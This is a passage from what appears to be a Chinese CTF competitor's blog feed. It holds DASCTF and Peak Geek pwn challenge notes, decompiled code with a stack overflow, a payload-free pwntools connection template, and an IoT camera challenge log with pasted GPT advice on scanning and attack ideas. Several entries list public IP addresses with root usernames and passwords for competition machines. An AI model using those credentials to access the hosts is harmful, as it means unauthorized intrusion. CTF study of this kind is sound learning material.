class="language-c">__int64 __fastcall main(int a1, char **a2, char **a3){  __int64 v4[3]; // [rsp+0h] [rbp-18h] BYREF  v4[1] = __readfsqword(0x28u);  v4[0] = (__int64)malloc(0x80uLL);  __printf_chk(1LL, "your vm starts at %llx\n", v4);  if ( !(unsigned __int8)sub_4014A0(v4[0]) || !(unsigned __int8)sub_401630(v4[0]) )  {    puts("learn reverse first");    abort();  }  sub_401700(v4[0]);  return 0LL;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DASCTF</title>
      <link href="/du-yu/dasctf.html"/>
      <url>/du-yu/dasctf.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、PWN"><a href="#一、PWN" class="headerlink" title="一、PWN"></a>一、PWN</h2><h3 id="1、FileEditor（附件pwn）"><a href="#1、FileEditor（附件pwn）" class="headerlink" title="1、FileEditor（附件pwn）"></a>1、FileEditor（附件pwn）</h3><p>题目：T1d师傅设计了一个文件编辑器，但是好像漏洞百出，请你帮他看看吧。</p><h3 id="2、signin（附件atta）"><a href="#2、signin（附件atta）" class="headerlink" title="2、signin（附件atta）"></a>2、signin（附件atta）</h3><p><strong>题目</strong>：Lotus听说0x401要办比赛，连夜出了一个签到题，快来看看吧</p><p>这些文件看起来像是一个Linux的内核映像（bzImage）、一个内核配置文件（config）、一个文件系统映像（roots.img）以及一个可能用于启动这些的脚本文件（run.sh）。</p><p>处理这些文件的具体方式取决于他们具体的内容和你的目标，但以下是一些一般性的步骤：</p><ol><li><strong>分析run.sh脚本</strong>：看一下run.sh文件中的内容。这个脚本可能会在虚拟环境（如QEMU）中启动bzImage和roots.img。如果脚本中存在命令行参数，那么这些参数可能在漏洞寻找过程中提供线索。</li><li><strong>分析bzImage文件</strong>：这是一个压缩的Linux内核映像。如果你怀疑内核中存在漏洞，你可能需要对其进行反汇编或者使用工具如IDA Pro进行深入的分析。你可以用像binwalk这样的工具查看bzImage中的内容。</li><li><strong>分析config文件</strong>：这是内核配置文件，可能包含有关内核构建选项的信息。查看此文件可能会提供有关可能存在的漏洞的线索。</li><li><strong>挂载和分析roots.img文件</strong>：这是文件系统映像。你可以在你的Linux系统上挂载它以查看其内容。分析文件系统中的文件和程序可能会发现一些有用的信息。</li><li><strong>启动虚拟机</strong>：最后，你应该使用run.sh脚本（或者类似的方式）在虚拟环境中启动这些文件，然后尝试找出并利用漏洞。</li></ol><h3 id="3、VIPhouse（附件）"><a href="#3、VIPhouse（附件）" class="headerlink" title="3、VIPhouse（附件）"></a>3、VIPhouse（附件）</h3><p><strong>题目</strong>：欢迎来到VIPhouse，听说你很了解canary，fmt，uaf，那来试试吧！</p><p>nc 118.24.24.233 9999</p><h3 id="4、DDLbook（pwn1-zip）"><a href="#4、DDLbook（pwn1-zip）" class="headerlink" title="4、DDLbook（pwn1.zip）"></a>4、DDLbook（pwn1.zip）</h3><p>T1d师傅总是忘记ddl，因此他给自己设计了一个ddl记事本，请你帮他把ddl记上去。</p><p>nc 132.232.105.182 8887</p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> DASCTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>天网杯</title>
      <link href="/du-yu/skynet.html"/>
      <url>/du-yu/skynet.html</url>
      
        <content type="html"><![CDATA[<h2 id="一、摄像头01（IOT）"><a href="#一、摄像头01（IOT）" class="headerlink" title="一、摄像头01（IOT）"></a>一、摄像头01（IOT）</h2><p>题目：</p><p>可接入设备号：2台<br>设备型号：IPC-MFW8443XS-ZRL-4E2-0832<br>用户名：cyberpeace<br>密码：MtRa4qdt6V78v2et<br>状态为进行中时显示设备接入IP<br>提示：请接入考生不要修改给出的密码一经发现影响后续线索机会</p><p>硬件接入IP：</p><p>10.90.1.1</p><p>问题更像是IoT（Internet of Things，物联网）安全，同时涵盖了PWN（从系统级别找到并利用漏洞）和Web安全（从Web应用角度找到并利用漏洞）两个方向。</p><p>根据设备型号以及其他信息，看起来这个设备是一个网络摄像头，可以从多个角度进行攻击。</p><ul><li><p><strong>硬件/PWN</strong>：你可以寻找固件中可能存在的安全漏洞，例如未授权的远程访问、缓冲区溢出、使用默认或弱密码等。根据题目要求，如果你能实现远程代码执行或造成设备拒绝服务，都可以得到分数。</p></li><li><p><strong>Web</strong>：你也可以从Web应用的角度寻找漏洞。例如，摄像头的Web接口可能存在XSS、CSRF、SQL注入等常见的Web安全问题。此外，你还可以检查设备是否允许未授权的访问，或者是否可以通过Web接口获取到敏感信息（例如监控数据）。</p></li></ul><p>建议你先根据设备的信息去查找可能存在的已知漏洞，如果没有找到，再根据你的特长和兴趣选择一个方向进行深入的挖掘。</p><h4 id="1-刚开始以为是ssh连接，连不上，ping了一下发现可以ping通"><a href="#1-刚开始以为是ssh连接，连不上，ping了一下发现可以ping通" class="headerlink" title="1.刚开始以为是ssh连接，连不上，ping了一下发现可以ping通"></a>1.刚开始以为是ssh连接，连不上，ping了一下发现可以ping通</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727110944619.png" alt="image-20230727110944619"></p><h4 id="2-搜网址然后登录"><a href="#2-搜网址然后登录" class="headerlink" title="2.搜网址然后登录"></a>2.搜网址然后登录</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727111129707.png" alt="image-20230727111129707"></p><h4 id="3-无脑查看了一下，感觉唯有用的就是设备信息？"><a href="#3-无脑查看了一下，感觉唯有用的就是设备信息？" class="headerlink" title="3.无脑查看了一下，感觉唯有用的就是设备信息？"></a>3.无脑查看了一下，感觉唯有用的就是设备信息？</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727112049550.png" alt="image-20230727112049550"></p><h4 id="4-找师傅帮忙"><a href="#4-找师傅帮忙" class="headerlink" title="4.找师傅帮忙"></a>4.找师傅帮忙</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727114422085.png" alt="image-20230727114422085"></p><h4 id="5-问GPT（真丢人哈哈哈哈）"><a href="#5-问GPT（真丢人哈哈哈哈）" class="headerlink" title="5.问GPT（真丢人哈哈哈哈）"></a>5.问GPT（真丢人哈哈哈哈）</h4><p>你的指导者建议你寻找设备的固件和查看端口对应的服务程序。这些都是在设备安全评估中非常重要的步骤。</p><p><strong>查找固件</strong></p><p>你可能需要找到设备的固件，这通常包括设备的操作系统和其他关键软件。有时候，设备的制造商会在其网站上提供固件的下载链接。你可以通过设备型号IPC-MFW8443XS-ZRL-4E2-0832进行搜索。如果你找到了固件，你可以下载并进行分析。固件分析可以揭示设备的工作原理，可能存在的漏洞，以及如何利用这些漏洞。</p><p><strong>查看端口和服务</strong></p><p>你需要查看设备开放的端口和这些端口对应的服务。这可以通过网络扫描工具，如Nmap进行。这个工具可以显示设备开放的端口，以及这些端口上运行的服务。例如，SSH服务通常运行在22端口，HTTP服务运行在80端口，HTTPS服务运行在443端口。</p><p>在你的情况下，你可以在你的计算机上安装Nmap，然后运行以下命令进行扫描：</p><pre class="line-numbers language-none"><code class="language-none">nmap -sV 10.90.1.1<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这个命令会扫描目标IP地址（在这个例子中是10.90.1.1），并尝试确定每个开放端口上运行的服务。</p><p>通过分析固件和端口服务，你可能会发现设备的一些弱点，这可能会帮助你在比赛中取得优势。在这个过程中，你需要遵守比赛规则和法律要求，不要进行未经授权的行为。</p><h4 id="6-查找固件"><a href="#6-查找固件" class="headerlink" title="6.查找固件"></a>6.查找固件</h4><h4 id="1-alhua-浙江大华技术股份有限公司"><a href="#1-alhua-浙江大华技术股份有限公司" class="headerlink" title="(1)    alhua:  浙江大华技术股份有限公司"></a>(1)    <strong>alhua</strong>:  浙江大华技术股份有限公司</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727185748222.png" alt="image-20230727185748222"></p><h4 id="2-上官网没找到对应型号"><a href="#2-上官网没找到对应型号" class="headerlink" title="(2)上官网没找到对应型号"></a>(2)上官网没找到对应型号</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727190941995.png" alt="image-20230727190941995"></p><h4 id="3-联系客服要程序包（固件）"><a href="#3-联系客服要程序包（固件）" class="headerlink" title="(3)联系客服要程序包（固件）"></a>(3)联系客服要程序包（固件）</h4><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727193654554.png" alt="image-20230727193654554"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727193716940.png" alt="image-20230727193716940"></p><p>笑死，程序包都没有，我超啊！</p><p>如果你无法获取到这个设备型号的固件包，确实可能会在寻找和利用PWN方向的漏洞时遇到一些挑战。通常情况下，能够获取到设备固件会大大方便漏洞的发现和利用，因为你可以在本地环境中反汇编、调试和测试。</p><p>但即使无法获取固件，你依然有一些其他的选择：</p><ol><li><p><strong>黑盒测试</strong>：你可以尝试对设备进行黑盒测试，也就是只依靠设备提供的接口和服务，通过发送各种各样的输入来尝试触发漏洞。这种方法可能需要一些创新和深度的理解，但在某些情况下可以发现一些出乎意料的漏洞。</p></li><li><p><strong>网络服务和Web接口</strong>：从你提供的nmap扫描结果来看，设备开放了80（HTTP）和554（RTSP）端口，你可以尝试通过这些服务和接口来寻找漏洞。例如，HTTP服务可能存在Web安全漏洞，而RTSP服务可能存在流媒体相关的漏洞。</p></li><li><p><strong>公开的漏洞数据库</strong>：你可以查找一些公开的漏洞数据库，如CVE（Common Vulnerabilities and Exposures），看是否有这个设备型号或其相近型号的已知漏洞。</p></li><li><p><strong>硬件测试</strong>：虽然这可能不适用于你当前的比赛，但在实际的安全评估中，你可以尝试对设备硬件进行测试，例如通过JTAG接口进行调试，或者直接从闪存芯片中提取固件。</p></li></ol><p>请记住，即使你不能通过PWN方向来找到漏洞，你依然可以通过其他方法（如Web安全漏洞）来满足题目的要求并获得分数。</p><h4 id="7-查看端口服务"><a href="#7-查看端口服务" class="headerlink" title="7.查看端口服务"></a>7.查看端口服务</h4><p>你的Nmap扫描结果显示，你的目标设备（IP地址10.90.1.1）在两个端口上提供服务：</p><ol><li>80端口：运行HTTP服务，可能是用于设备配置的web界面。</li><li>554端口：运行RTSP服务，这是一个网络流媒体协议，通常用于IP摄像头等设备发送视频流。</li></ol><p>这些结果告诉你可以通过这两个端口进行进一步的探索。</p><p>对于80端口，你可以尝试在浏览器中访问 <a href="http://10.90.1.1,看看是否可以打开一个配置页面或者其他有用的信息.同时,你也可以通过工具如burp/">http://10.90.1.1，看看是否可以打开一个配置页面或者其他有用的信息。同时，你也可以通过工具如Burp</a> Suite等对其进行爬取和渗透测试。</p><p>对于554端口，你可能需要了解更多关于RTSP协议的知识。通常来说，RTSP服务可能会包含认证机制，来防止未经授权的用户接入视频流。你可以使用专门的RTSP客户端软件（如VLC）尝试连接到 rtsp://10.90.1.1，看看是否需要用户名和密码。</p><p>同时，你也可以查找这两个服务的已知漏洞。可以通过搜索设备型号、服务类型（如HTTP或RTSP）、以及具体的服务版本号（如果有）来查找可能存在的已知漏洞。这些漏洞可能已经被列入CVE数据库，你可以在其中查找可能的攻击向量。但是请记住，在没有明确的授权情况下，不要对任何设备进行攻击行为。</p><p>你还可以尝试通过固件分析查找漏洞。尝试下载和分析设备的固件，可能会发现未公开的漏洞或者更深入的设备工作机制。</p><p>以上都是一些可能的方向，你需要结合实际情况进行选择和深入。在这个过程中，也需要遵守比赛规则和法律要求，进行合法的行为。</p><h5 id="1-一大堆代码的作用"><a href="#1-一大堆代码的作用" class="headerlink" title="1.一大堆代码的作用"></a>1.一大堆代码的作用</h5><p>这些数据是Nmap提供的服务指纹，它是对设备上运行的服务响应的一个描述。这些信息在确定具体运行服务的版本上可能有用，尤其是对于那些Nmap无法直接识别的服务。这些信息可以提供一些线索，用于在CVE数据库或者其他漏洞库中搜索已知的漏洞。</p><p>在这个例子中，Nmap并未准确识别出服务的版本，但是给出了HTTP和RTSP服务的一些信息。例如，对于HTTP服务，返回的头信息包括”X-Frame-Options: SAMEORIGIN”，”Strict-Transport-Security: max-age=604800; includeSubDomains”等安全性相关的头信息，这可能提示这个服务有一定的安全配置。对于RTSP服务，返回的信息中包括一些RTSP协议的命令，如”OPTIONS, DESCRIBE, ANNOUNCE, SETUP, PLAY, RECORD, PAUSE, TEARDOWN, SET_PARAMETER, GET_PARAMETER”等，这可能提示服务的功能和可能的操作。</p><p>虽然这些信息可能没有直接的用途，但它们可以提供更多关于设备和服务的细节信息，帮助你更好地理解设备的工作机制，并找到可能的攻击点。在某些情况下，这些信息也可能揭示一些隐藏的服务或者功能，或者帮助识别一些非标准的配置或者行为，这都可能是你寻找漏洞的线索。</p><h4 id="8-思路"><a href="#8-思路" class="headerlink" title="8.思路"></a>8.思路</h4><p>你的比赛目标是找到设备的三种类型的漏洞：远程代码执行、远程获取设备监控数据和远程拒绝服务。为了达到这个目标，你可以考虑以下步骤：</p><ol><li><p><strong>远程代码执行（RCE）</strong>：RCE通常是由于服务端存在严重的安全漏洞，如反序列化漏洞、命令注入、路径遍历等。通过这些漏洞，攻击者可以在远程执行代码，通常可以获取root权限。你可以在Web服务和RTSP服务中寻找这些类型的漏洞。使用如Burp Suite等渗透工具进行模糊测试，尝试常见的攻击向量。</p></li><li><p><strong>远程获取设备监控数据</strong>：这个目标通常可以通过绕过或破解RTSP服务的认证机制来实现。这可能需要通过密码猜测、会话劫持、加密破解等手段。如果你能访问设备的Web界面，可能会找到某些配置选项或信息可以帮助你。</p></li><li><p><strong>远程拒绝服务（DoS）</strong>：DoS通常通过发送大量的数据或特殊构造的请求来实现，使设备无法处理正常的请求。你需要研究设备的网络服务，查找可能的漏洞或弱点。例如，如果设备的HTTP服务不能处理大量的请求，或者RTSP服务在处理特定格式的请求时会崩溃，那么这都可能成为DoS的攻击向量。</p></li></ol><p>此外，还要注意固件分析。从设备的固件中，你可能能找到隐藏的服务、硬编码的凭据、未公开的API等，这些都可能帮助你找到漏洞。如果可能，尝试从制造商的网站或其他资源下载设备的固件，然后使用如Binwalk、Ghidra等工具进行分析。</p><p>最后，请记住在进行所有操作时都要遵守比赛的规则和法律。祝你在比赛中取得好成绩！</p><h4 id="9-DOS和DDOS的区别"><a href="#9-DOS和DDOS的区别" class="headerlink" title="9.DOS和DDOS的区别"></a>9.DOS和DDOS的区别</h4><p>DoS和DDoS都是拒绝服务攻击，但他们有一些关键的区别。</p><ol><li><p><strong>DoS（Denial of Service）</strong>：拒绝服务攻击是一种阻止合法用户访问特定的网络资源或服务的攻击手法。这通常通过利用特定的漏洞或弱点来实现，例如发送大量数据或特殊构造的请求，导致服务器崩溃或无法处理正常的请求。</p></li><li><p><strong>DDoS（Distributed Denial of Service）</strong>：分布式拒绝服务攻击是一种更加复杂的拒绝服务攻击。在DDoS攻击中，攻击者会利用多台计算机（称为“僵尸网络”）同时向目标服务器发送大量的请求，目的是让服务器无法处理正常的请求。</p></li></ol><p>在你的比赛中，如果只需要使设备无法提供正常服务，那么可能只需要执行DoS攻击。如果需要在多个设备之间协调攻击，才需要使用DDoS攻击。尽管在实践中，DDoS攻击通常更具破坏力，但这并不意味着DoS攻击不重要。任何可以影响设备正常运行的攻击，都需要被认真对待。</p><h2 id="二、操作系统01"><a href="#二、操作系统01" class="headerlink" title="二、操作系统01"></a>二、操作系统01</h2><p>端口全放行<br>原始账号：root<br>原始密码：@Twb_202307#@!</p><p>IP地址：122.9.97.54</p><p>服务状态：运行中</p><p>用户名：root</p><p>密码：iDJwiDRZhuf3@1aA</p><p><strong>镜像：</strong>uos_desktop.qcow2</p><h2 id="三、操作系统02"><a href="#三、操作系统02" class="headerlink" title="三、操作系统02"></a>三、操作系统02</h2><p>端口全放行<br>原始账号：root<br>原始密码：@Twb_202307#@!</p><p>IP地址：218.245.100.161</p><p>服务状态：运行中</p><p>用户名：root</p><p>密码：mO5bnZ34T32D@1aA</p><p><strong>镜像：</strong> uos_serve_os.qcow2</p><h2 id="四、操作系统03"><a href="#四、操作系统03" class="headerlink" title="四、操作系统03"></a>四、操作系统03</h2><p>端口全放行<br>原始账号：nfs<br>原始密码：nfschina123</p><p>IP地址：</p><p>116.63.95.224</p><p>服务状态：运行中</p><p>用户名：nfs</p><p>密码：7l7txK0G1RPF@1aA</p><p><strong>镜像：</strong>fangde_desktop.qcow2</p><h2 id="五、操作系统04"><a href="#五、操作系统04" class="headerlink" title="五、操作系统04"></a>五、操作系统04</h2><p>端口全放行<br>原始账号：root<br>原始密码：P!ssw9rd</p><p>IP地址：122.9.106.178</p><p>服务状态：运行中</p><p>用户名：root</p><p>密码：UgiW63RxbfPK@1aA</p><p><strong>镜像：</strong>fangde_desktop.qcow2</p><h2 id="六、操作系统05"><a href="#六、操作系统05" class="headerlink" title="六、操作系统05"></a>六、操作系统05</h2><p>端口:全放行<br>原始账号：root<br>原始密码：Qwe123,./l;’</p><p>IP地址：218.245.102.203</p><p>服务状态：运行中</p><p>用户名：root</p><p>密码：yDdk7tsLvFsE@1aA</p><p>**镜像:**kyln0717.qcow2</p><h2 id="七、数据库01"><a href="#七、数据库01" class="headerlink" title="七、数据库01"></a>七、数据库01</h2><p>放行端口： 2003/tcp 22/tcp<br>原始账号：root<br>原始密码：oo3Ymn%MLM5Q</p><p>IP地址：116.63.79.7</p><p>服务状态：运行中</p><p>用户名：root</p><p>密码：wlwaAe3dwGeX@1aA</p><p><strong>镜像：</strong>shenzhou_database.qcow2</p><h2 id="八、数据库02"><a href="#八、数据库02" class="headerlink" title="八、数据库02"></a>八、数据库02</h2><p>端口放行：22,10011/tcp<br>原始账号：root<br>原始密码：Sx33F44EL22r</p><p>IP地址：122.9.48.253</p><p>服务状态：运行中</p><p>用户名：root</p><p>密码：Bybg6nFoMr9p@1aA</p><p><strong>镜像：</strong>nanda_database.qcow2</p><h2 id="九、数据库03"><a href="#九、数据库03" class="headerlink" title="九、数据库03"></a>九、数据库03</h2><p>放行端口：22,54322/tcp<br>原始账号：root<br>原始密码：snwa@123</p><p>IP地址：218.245.100.154</p><p>服务状态：运行中</p><p>用户名：root</p><p>密码：ePwJbiA8DADA@1aA</p><p><strong>镜像：</strong>jingcan_database.qcow2</p><h2 id="十、网络安全产品01"><a href="#十、网络安全产品01" class="headerlink" title="十、网络安全产品01"></a>十、网络安全产品01</h2><p>端口放行：3000-3006/tcp<br>原始账号：root<br>原始密码：E4QXkgbkmhia</p><p>IP地址：116.63.74.152</p><p>服务状态：运行中</p><p>用户名：root</p><p>密码：36zLp6Uuzifl@1aA</p><p><strong>镜像：</strong>beixinyaun3.0.qcow2</p><p><strong>附件：</strong>linux服务器客户端</p><h2 id="申请的战队截图"><a href="#申请的战队截图" class="headerlink" title="申请的战队截图"></a>申请的战队截图</h2><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230726215039230.png" alt="image-20230726215039230"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230726215120153.png" alt="image-20230726215120153"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230726215140934.png" alt="image-20230726215140934"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727114830521.png" alt="image-20230727114830521"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727131410333.png" alt="image-20230727131410333"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727181601670.png" alt="image-20230727181601670"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727195757515.png" alt="image-20230727195757515"></p><p><img src="https://du-yu-1319091606.cos.ap-beijing.myqcloud.com/image-20230727195812052.png" alt="image-20230727195812052"></p>]]></content>
      
      
      <categories>
          
          <category> IOT </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 天网杯 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>巅峰极客</title>
      <link href="/du-yu/peakedness.html"/>
      <url>/du-yu/peakedness.html</url>
      
        <content type="html"><![CDATA[<p>都学半个月了，还是一个PWN打不出来、又是自闭的一天，快学，真的不想当师傅们的破绽啊，淦 QAQ……….</p><p><a href="https://peekgeek.xctf.org.cn/race/dfjk">https://peekgeek.xctf.org.cn/race/dfjk</a></p><h2 id="一、PWN01-Linkmap"><a href="#一、PWN01-Linkmap" class="headerlink" title="一、PWN01 (Linkmap)"></a>一、PWN01 (Linkmap)</h2><h3 id="一、checksec"><a href="#一、checksec" class="headerlink" title="一、checksec"></a>一、checksec</h3><p><code>checksec</code> 的输出，这个命令是用来检查一个可执行文件的安全特性。从你给出的信息来看，该二进制文件有以下特性：</p><ul><li>Arch: amd64-64-little：程序的架构是 64 位的 AMD 或 x86。</li><li>Full RELRO：RELRO 是 RELocation Read-Only 的缩写，用于在程序运行期间保护某些程序内存段不被修改。全 RELRO 模式表示 GOT 表是只读的，防止了 overwrite attacks。</li><li>No canary found：这表明在栈上没有发现 stack canary，也就是说栈溢出保护未开启，这可能使程序容易受到 buffer overflow 攻击。</li><li>NX enabled：这表示内存中的 no-execute (NX) 位已启用。也就是说，将内存标记为数据并阻止执行，使得攻击者无法在数据段（例如堆或栈）中插入并执行 shellcode。</li><li>No PIE：PIE 是 Position Independent Executable 的缩写，如果没有开启，那么程序每次加载时，其位置将是固定的，否则每次程序运行时加载到内存的地址都会发生变化。不开启 PIE 使得程序易受到 Return Oriented Programming (ROP) 或 Jump Oriented Programming (JOP) 攻击。</li></ul><p>综上，从这个二进制文件的特性来看，该二进制文件可能最容易受到栈溢出攻击，因为没有开启 stack canary。同时，由于没有启用 PIE，使其也可能受到 ROP 或 JOP 攻击。</p><p>在做进一步的二进制漏洞利用时，应当首先试图探查这些可能的攻击方式，分析软件的详细行为，可能的漏洞和缓冲区溢出的地方。</p><h3 id="二、C源代码"><a href="#二、C源代码" class="headerlink" title="二、C源代码"></a>二、C源代码</h3><pre class="line-numbers language-c" data-language="c"><code class="language-c">// positive sp value has been detected, the output may be wrong!// 检测到了正的sp值，输出可能是错误的！void __fastcall __norestart start(__int64 a1, __int64 a2, void (*a3)(void))// 定义一个不返回（__noreturn）的函数start，它接受两个__int64类型参数和一个函数指针参数。{  __int64 v3; // rax  // 定义一个__int64类型的变量v3，表示rax寄存器。  int v4; // esi  // 定义一个整型变量v4，表示esi寄存器。  __int64 v5; // [rsp-8h] [rbp-8h] BYREF  // 定义一个__int64类型的变量v5，表示栈上的数据。  char *retaddr; // [rsp+0h] [rbp+0h] BYREF  // 定义一个字符型指针变量retaddr，表示返回地址。  v4 = v5;  // 将v5的值赋给v4。  v5 = v3;  // 将v3的值赋给v5。  _libc_start_main(main, v4, &amp;retaddr, init, fini, a3, &amp;v5);  // 调用_libc_start_main函数，将程序控制权转交给main函数，同时设定了程序的初始化和结束时的操作。  __halt();  // 执行停止指令，结束程序。}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">// attributes: thunkint __fastcall _libc_start_main(        int (__fastcall *main)(int, char **, char **),        int argc,        char **ubp_av,        void (*init)(void),        void (*fini)(void),        void (*rtld_fini)(void),        void *stack_end){  return __libc_start_main(main, argc, ubp_av, init, fini, rtld_fini, stack_end);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 __fastcall main(__int64 a1, char **a2, char **a3){  char buf[16]; // [rsp+0h] [rbp-10h] BYREF  sub_40071B(a1, a2, a3);  read(0, buf, 0x100uLL);  return 0LL;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-c" data-language="c"><code class="language-c">int sub_40071B(){  return setvbuf(stdin, 0LL, 2, 0LL);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p> <code>sub_40071B</code> 函数中，调用了 <code>setvbuf(stdin, 0LL, 2, 0LL);</code>，这个函数调用设置了 <code>stdin</code> 的缓冲方式为无缓冲（<code>_IONBF</code>，对应的值为2），并且没有为其指定自定义的缓冲区（因为 <code>buffer</code> 参数为 <code>NULL</code>）。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">// attributes: thunkint setvbuf(FILE *stream, char *buf, int modes, size_t n){  return __imp_setvbuf(stream, buf, modes, n);}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>setvbuf</code> 函数只是简单地调用了 <code>__imp_setvbuf</code> 函数。这是一个典型的转发函数（thunk），它的功能只是将函数调用转发给另一个函数。这样的设计常常是因为存在库函数被别的库函数替代的情况，或者为了实现一些特定的编程模式，例如动态链接或者延迟加载等。</p><p>在这个函数中，<code>__imp_setvbuf</code> 函数应该与标准的 <code>setvbuf</code> 函数具有相同的功能，也就是设置给定文件流的缓冲模式。这个函数的参数意义如下：</p><ul><li><code>stream</code>：这是一个 <code>FILE *</code> 类型的指针，表示要设置缓冲模式的文件流。</li><li><code>buf</code>：这是一个 <code>char *</code> 类型的指针，表示要设置的缓冲区。如果这个参数为 <code>NULL</code>，那么系统会自动管理缓冲区。</li><li><code>modes</code>：这是一个 <code>int</code> 类型的变量，用来设置缓冲模式。这个参数可以是 <code>_IOFBF</code>（完全缓冲）、<code>_IOLBF</code>（行缓冲）或者 <code>_IONBF</code>（无缓冲）中的一个。</li><li><code>n</code>：这是一个 <code>size_t</code> 类型的变量，表示缓冲区的大小。</li></ul><pre class="line-numbers language-c" data-language="c"><code class="language-c">void __fastcall init(unsigned int a1, __int64 a2, __int64 a3){  signed __int64 v4; // rbp  __int64 i; // rbx  v4 = &amp;off_600DF0 - off_600DE8;  init_proc();  if ( v4 )  {    for ( i = 0LL; i != v4; ++i )      ((void (__fastcall *)(_QWORD, __int64, __int64))off_600DE8[i])(a1, a2, a3);  }}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>如果 <code>v4</code> 不为零（即 <code>&amp;off_600DF0 - off_600DE8</code> 不为零），它将会在一个循环中执行一系列函数。这些函数的地址被保存在 <code>off_600DE8</code> 开始的地址空间中。</p><p>它使用了三个参数 <code>a1</code>, <code>a2</code>, 和 <code>a3</code>，这些参数在循环中被传递给每一个被调用的函数。因为我们没有这些函数的具体信息，我们无法得知这些参数的具体用途。</p><p>这个函数可能是在程序初始化时被调用的，用来执行一系列的初始化操作。如果 <code>&amp;off_600DF0 - off_600DE8</code> 不为零，那么就会有一系列的函数被调用，每一个函数的地址被保存在 <code>off_600DE8</code> 开始的地址空间中。这是一种常见的程序设计模式，例如在C++中的全局对象构造函数或者静态初始化就会使用类似的机制。</p><pre class="line-numbers language-c" data-language="c"><code class="language-c">void *init_proc(){  void *result; // rax  result = &amp;__gmon_start__;  if ( &amp;__gmon_start__ )    return (void *)_gmon_start__();  return result;}<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><code>init_proc</code> 函数在这里看起来主要是关于gmon的相关操作。gmon是GNU Profiling程序的一部分，它用于收集程序执行过程中的一些统计信息，以便于分析程序的性能。</p><p><code>__gmon_start__</code> 是在gmon中使用的特殊符号，当链接了gmon库时，<code>__gmon_start__</code> 会被定义。当程序启动时，如果 <code>__gmon_start__</code> 已经被定义，那么会自动调用 <code>__gmon_start__</code> 函数，开始收集性能统计信息。</p><p>在 <code>init_proc</code> 函数中，它首先检查 <code>__gmon_start__</code> 是否已经被定义，如果已经定义，就调用 <code>_gmon_start__()</code> 函数，否则什么都不做。</p><h3 id="解析"><a href="#解析" class="headerlink" title="解析"></a>解析</h3><p>这个问题涉及到一个称为 “linkmap” 的技术。在 Linux 中，linkmap 是一个数据结构，用于在加载动态库时存储有关库的信息。当一个程序加载多个动态库时，会有一个 linkmap 链表来存储这些库的信息。</p><p>由于这个程序存在栈溢出漏洞，并且开启了 NX，没有开启 PIE，所以可以使用 ROP（Return-oriented programming）来构造攻击。而 “linkmap” 的技术则可以帮助我们找到动态库中函数的地址，从而绕过 ASLR。</p><p>构造攻击代码需要对具体的二进制程序进行详细分析，我们需要知道如何利用 linkmap 来获取函数地址，以及如何利用栈溢出来控制程序执行流程。另外，需要注意的是，网络连接的代码可能需要根据实际环境进行修改。</p><p>下面是一个基本的 Python 代码模板，使用 pwntools 库来连接到远程服务。这个模板尚未包含具体的攻击代码，你需要根据实际的二进制程序来完成攻击代码的编写：</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">from pwn import *def exploit():    # 连接到远程服务    conn = remote("pwn-5bdeb2b31c.challenge.xctf.org.cn", 9999, ssl=True)    # 这里添加你的攻击代码，例如发送一个包含 ROP 链的字符串    # 让程序继续执行，直到结束或者触发一个异常    conn.interactive()if __name__ == "__main__":    exploit()<span aria-hidden="true" 